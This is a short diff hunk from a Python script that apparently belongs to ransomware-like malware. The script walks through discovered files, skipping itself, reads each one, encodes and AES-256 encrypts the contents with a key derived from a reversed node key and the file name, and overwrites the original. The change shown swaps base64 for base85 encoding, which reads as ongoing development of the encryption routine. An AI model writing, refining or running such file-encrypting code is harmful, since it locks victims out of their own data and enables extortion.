@@ -59,7 +59,7 @@ for f in tool.files_found:
         if f != sys.argv[0] and f != "egg_{0}.txt".format(node_sig):
             with open(f, "rb") as fl:
                 data = fl.read()
-            encoded_data = base64.b64encode(data)
+            encoded_data = base64.b85encode(data)
             tmp_key = node_key[::-1] + f[::-1]
             encrypted_data = aes256.encrypt(encoded_data.decode(), tmp_key)
             with open(f, "wb") as fl:
